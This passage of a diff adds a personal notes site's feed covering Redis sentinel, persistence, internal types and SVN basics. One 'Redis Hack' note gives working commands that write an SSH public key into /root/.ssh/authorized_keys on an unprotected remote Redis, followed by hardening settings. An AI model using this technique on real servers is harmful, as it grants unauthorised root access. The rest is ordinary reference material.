+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_0.conf --sentinel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_1.conf --sentinel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$redis_server&lt;/span> sentinel_2.conf --sentinel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Redis Hack</title><link>/note/data/redis/redis-hack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-hack/</guid><description>
+&lt;h2 id="remote-login">Remote login&lt;/h2>
+&lt;h3 id="how-to-replay">How to replay&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ssh-keygen –t rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87">echo&lt;/span> -e &lt;span style="color:#4e9a06">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> cat id_rsa.pub&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#204a87">echo&lt;/span> -e &lt;span style="color:#4e9a06">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span> &amp;gt; foo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat foo &lt;span style="color:#000;font-weight:bold">|&lt;/span> redis-cli -h &lt;span style="color:#000">$remote_ip&lt;/span> -x &lt;span style="color:#204a87">set&lt;/span> crack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ redis-cli -h &lt;span style="color:#000">$remote_ip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># in redis CLI&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>config &lt;span style="color:#204a87">set&lt;/span> dir /root/.ssh/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>config get dir
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>config &lt;span style="color:#204a87">set&lt;/span> dbfilename &lt;span style="color:#4e9a06">&amp;#34;authorized_keys&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># save /root/.ssh/authorized_keys&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="how-to-avoid">How to avoid&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># redis.conf&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># disable to change dbfilename via remote connetion&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rename-command FLUSHALL &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rename-command CONFIG &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rename-command EVAL &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>requirepass mypassword
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">bind&lt;/span> 127.0.0.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>groupadd -r redis &lt;span style="color:#ce5c00;font-weight:bold">&amp;amp;&amp;amp;&lt;/span> useradd -r -g redis redis
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Note: Redis Persistence</title><link>/note/data/redis/redis-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-persistence/</guid><description>
+&lt;h2 id="persistence">persistence&lt;/h2>
+&lt;h3 id="rdb">RDB&lt;/h3>
+&lt;p>fork sub process periodically and dump to a single file&lt;/p>
+&lt;h3 id="aof-appended-only-file">AOF, appended only file&lt;/h3>
+&lt;p>log every writer and delete records&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-conf" data-lang="conf"># after 300s, dump if at least 10 key changed
+save 300 10
+# aof, always no
+# every second
+appendfsync everysec
+# grow 100% then rewrite
+auto-aof-rewrite-percentage 100
+auto-aof-rewrite-min-size 64mb
+&lt;/code>&lt;/pre></description></item><item><title>Note: Redis Sentinel</title><link>/note/data/redis/redis-sentinel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-sentinel/</guid><description>
+&lt;h2 id="sentinel">sentinel&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ping
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>info replication
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>info server
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>info sentinel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel auth-pass &amp;lt;name&amp;gt; &amp;lt;password&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel masters
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel master &amp;lt;name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel slaves &amp;lt;name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 返回指定master的ip和端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 正在进行failover或者failover已经完成，将显示被提升为master的slave的ip和端口&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel get-master-addr-by-name &amp;lt;name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 重置名字匹配该正则表达式的所有的master的状态信息&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel reset &amp;lt;pattern&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 执行failover，无需其他sentinel同意&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel failover &amp;lt;master name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 监听一个新的master&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel monitor &amp;lt;name&amp;gt; &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; &amp;lt;quorum&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 放弃对某个master的监听&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel remove &amp;lt;name&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 改变指定master的配置，支持多个&amp;lt;option&amp;gt; &amp;lt;value&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sentinel &lt;span style="color:#204a87">set&lt;/span> &amp;lt;name&amp;gt; &amp;lt;option&amp;gt; &amp;lt;value&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="conf">conf&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 26379&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>redis-sentinel /path/to/sentinel.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>redis-server /path/to/sentinel.conf --sentinel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sentinelconf">sentinel.conf&lt;/h3>
+&lt;p>sentinel monitor mymaster 127.0.0.1 6379 2
+sentinel down-after-milliseconds mymaster 60000
+sentinel failover-timeout mymaster 180000
+sentinel parallel-syncs mymaster 1&lt;/p>
+&lt;p>sentinel monitor resque 192.168.1.3 6380 4
+sentinel down-after-milliseconds resque 10000
+sentinel failover-timeout resque 180000
+sentinel parallel-syncs resque 5&lt;/p>
+&lt;h3 id="sentinel-monitor-mymaster-127001-6379-2">sentinel monitor mymaster 127.0.0.1 6379 2&lt;/h3>
+&lt;p>2 当集群中有2个sentinel认为master死了时，才能真正认为该master已经不可用了&lt;/p>
+&lt;h3 id="sentinel-option_name-master_name-option_value">sentinel &amp;lt;option_name&amp;gt; &amp;lt;master_name&amp;gt; &amp;lt;option_value&amp;gt;&lt;/h3>
+&lt;p>所有的配置都可以在运行时用命令SENTINEL SET command动态修改。&lt;/p>
+&lt;h4 id="down-after-milliseconds">down-after-milliseconds&lt;/h4>
+&lt;p>sentinel会向master发送心跳PING来确认master是否存活，如果master在“一定时间范围”内不回应PONG 或者是回复了一个错误消息，那么这个sentinel会主观地(单方面地)认为这个master已经不可用了&lt;/p>
+&lt;h4 id="parallel-syncs">parallel-syncs&lt;/h4>
+&lt;p>在发生failover主备切换时，这个选项指定了最多可以有多少个slave同时对新的master进行同步，这个数字越小，完成failover所需的时间就越长，但是如果这个数字越大，就意味着越多的slave因为replication而不可用。可以通过将这个值设为 1 来保证每次只有一个slave处于不能处理命令请求的状态。&lt;/p>
+&lt;h4 id="heading">&lt;/h4>
+&lt;p>sentinel对于不可用有两种不同的看法，一个叫主观不可用(SDOWN),另外一个叫客观不可用(ODOWN)。SDOWN是sentinel自己主观上检测到的关于master的状态，ODOWN需要一定数量的sentinel达成一致意见才能认为一个master客观上已经宕掉，各个sentinel之间通过命令SENTINEL is_master_down_by_addr来获得其它sentinel对master的检测结果。&lt;/p>
+&lt;p>min-slaves-to-write 1
+min-slaves-max-lag 10&lt;/p>
+&lt;p>当一个redis是master时，如果它不能向至少一个slave写数据(上面的min-slaves-to-write指定了slave的数量)，它将会拒绝接受客户端的写请求。由于复制是异步的，master无法向slave写数据意味着slave要么断开连接了，要么不在指定时间内向master发送同步数据的请求了(上面的min-slaves-max-lag指定了这个时间)&lt;/p>
+&lt;h3 id="向sentinel订阅消息">向sentinel订阅消息&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>psubscribe *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>psubscribe sdown
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>&amp;lt;instance-type&amp;gt; &amp;lt;name&amp;gt; &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; @ &amp;lt;master-name&amp;gt; &amp;lt;master-ip&amp;gt; &amp;lt;master-port&amp;gt;
+所有收到的消息的消息格式
++reset-master &amp;lt;instance details&amp;gt; -- 当master被重置时.
++slave &amp;lt;instance details&amp;gt; -- 当检测到一个slave并添加进slave列表时.
++failover-state-reconf-slaves &amp;lt;instance details&amp;gt; -- Failover状态变为reconf-slaves状态时
++failover-detected &amp;lt;instance details&amp;gt; -- 当failover发生时
++slave-reconf-sent &amp;lt;instance details&amp;gt; -- sentinel发送SLAVEOF命令把它重新配置时
++slave-reconf-inprog &amp;lt;instance details&amp;gt; -- slave被重新配置为另外一个master的slave，但数据复制还未发生时。
++slave-reconf-done &amp;lt;instance details&amp;gt; -- slave被重新配置为另外一个master的slave并且数据复制已经与master同步时。
+-dup-sentinel &amp;lt;instance details&amp;gt; -- 删除指定master上的冗余sentinel时 (当一个sentinel重新启动时，可能会发生这个事件).
++sentinel &amp;lt;instance details&amp;gt; -- 当master增加了一个sentinel时。
++sdown &amp;lt;instance details&amp;gt; -- 进入SDOWN状态时;
+-sdown &amp;lt;instance details&amp;gt; -- 离开SDOWN状态时。
++odown &amp;lt;instance details&amp;gt; -- 进入ODOWN状态时。
+-odown &amp;lt;instance details&amp;gt; -- 离开ODOWN状态时。
++new-epoch &amp;lt;instance details&amp;gt; -- 当前配置版本被更新时。
++try-failover &amp;lt;instance details&amp;gt; -- 达到failover条件，正等待其他sentinel的选举。
++elected-leader &amp;lt;instance details&amp;gt; -- 被选举为去执行failover的时候。
++failover-state-select-slave &amp;lt;instance details&amp;gt; -- 开始要选择一个slave当选新master时。
+no-good-slave &amp;lt;instance details&amp;gt; -- 没有合适的slave来担当新master
+selected-slave &amp;lt;instance details&amp;gt; -- 找到了一个适合的slave来担当新master
+failover-state-send-slaveof-noone &amp;lt;instance details&amp;gt; -- 当把选择为新master的slave的身份进行切换的时候。
+failover-end-for-timeout &amp;lt;instance details&amp;gt; -- failover由于超时而失败时。
+failover-end &amp;lt;instance details&amp;gt; -- failover成功完成时。
+switch-master &amp;lt;master name&amp;gt; &amp;lt;oldip&amp;gt; &amp;lt;oldport&amp;gt; &amp;lt;newip&amp;gt; &amp;lt;newport&amp;gt; -- 当master的地址发生变化时。通常这是客户端最感兴趣的消息了。
++tilt -- 进入Tilt模式。
+-tilt -- 退出Tilt模式。
+&lt;/code>&lt;/pre></description></item><item><title>Note: Redis Type</title><link>/note/data/redis/redis-type/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/data/redis/redis-type/</guid><description>
+&lt;h2 id="redisobject">redisObject&lt;/h2>
+&lt;p>Redis 类型系统的核心，数据库中的每个键、值，以及Redis 本身处理的参数，都表示为这种数据类型&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">// server.h
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* The actual Redis Object */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_STRING 0 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* String object. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_LIST 1 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* List object. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_SET 2 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Set object. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ZSET 3 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Sorted set object. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_HASH 4 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Hash object. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">/* Objects encoding. Some kind of objects like Strings and Hashes can be
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"> * internally represented in multiple ways. The &amp;#39;encoding&amp;#39; field of the object
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"> * is set to one of this fields for this object. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_RAW 0 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Raw representation */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为字符串
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_INT 1 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as integer */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为整数
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_HT 2 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as hash table */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为哈希表
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_ZIPMAP 3 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as zipmap */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_LINKEDLIST 4 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* No longer used: old list encoding. */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_ZIPLIST 5 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as ziplist */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为压缩列表
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_INTSET 6 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as intset */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为整数集合
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_SKIPLIST 7 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as skiplist */&lt;/span>&lt;span style="color:#8f5902;font-style:italic"> &lt;/span>&lt;span style="color:#8f5902;font-style:italic">// 编码为跳跃表
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_EMBSTR 8 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Embedded sds string encoding */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_QUICKLIST 9 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as linked list of ziplists */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">#define OBJ_ENCODING_STREAM 10 &lt;/span>&lt;span style="color:#8f5902;font-style:italic">/* Encoded as a radix tree of listpacks */&lt;/span>&lt;span style="color:#8f5902;font-style:italic">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">typedef&lt;/span> &lt;span style="color:#204a87;font-weight:bold">struct&lt;/span> &lt;span style="color:#000">redisObject&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// 数据类型，OBJ_STRING等
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">unsigned&lt;/span> &lt;span style="color:#f57900">type&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// 编码方式，OBJ_ENCODING_RAW等
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">unsigned&lt;/span> &lt;span style="color:#f57900">encoding&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// #define LRU_BITS 24
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// LRU 时间
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">unsigned&lt;/span> &lt;span style="color:#f57900">lru&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>&lt;span style="color:#000">LRU_BITS&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#8f5902;font-style:italic">/* LRU time (relative to global lru_clock) or
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"> * LFU data (least significant 8 bits frequency
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"> * and most significant 16 bits access time). */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// 引用计数
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">refcount&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// 指向对象的值
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">void&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">*&lt;/span>&lt;span style="color:#000">ptr&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#000">robj&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="类型自省">类型自省&lt;/h2>
+&lt;h3 id="type-keyname">&lt;code>type keyname&lt;/code>&lt;/h3>
+&lt;p>&lt;strong>type&lt;/strong> REDIS_STRING, REDIS_LIST, REDIS_HASH, REDIS_SET or REDIS_ZSET,&lt;/p>
+&lt;h3 id="object-encoding-keyname">&lt;code>object encoding keyname&lt;/code>&lt;/h3>
+&lt;p>&lt;strong>encoding&lt;/strong> int, embstr or raw for REDIS_STRING,&lt;/p>
+&lt;h3 id="object-idletime-keyname-unit-is-second">&lt;code>object idletime keyname (unit is second)&lt;/code>&lt;/h3>
+&lt;p>&lt;strong>lru&lt;/strong> access time&lt;/p>
+&lt;h3 id="object-refcount-keyname">&lt;code>object refcount keyname&lt;/code>&lt;/h3>
+&lt;p>only for number-format string, shared object ref count&lt;/p>
+&lt;h2 id="string">String&lt;/h2>
+&lt;h3 id="simple-dynamic-string">Simple Dynamic String&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">struct&lt;/span> &lt;span style="color:#000">sdshdr&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">len&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">free&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">char&lt;/span> &lt;span style="color:#000">buf&lt;/span>&lt;span style="color:#000;font-weight:bold">[];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="redis_string">REDIS_STRING&lt;/h3>
+&lt;p>&lt;strong>int&lt;/strong>, 8 bytes long&lt;/p>
+&lt;p>&lt;strong>embstr&lt;/strong> &amp;lt;=39 bytes readonly string&lt;/p>
+&lt;p>&lt;strong>raw&lt;/strong> &amp;gt; 39 bytes&lt;/p></description></item><item><title>Note: Svn</title><link>/note/ops/vcs/svn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/note/ops/vcs/svn/</guid><description>
+&lt;h2 id="checkout">checkout&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># clone&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>svn co https://localhost/user/repo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>svn co https://localhost/username/repo -r some_version
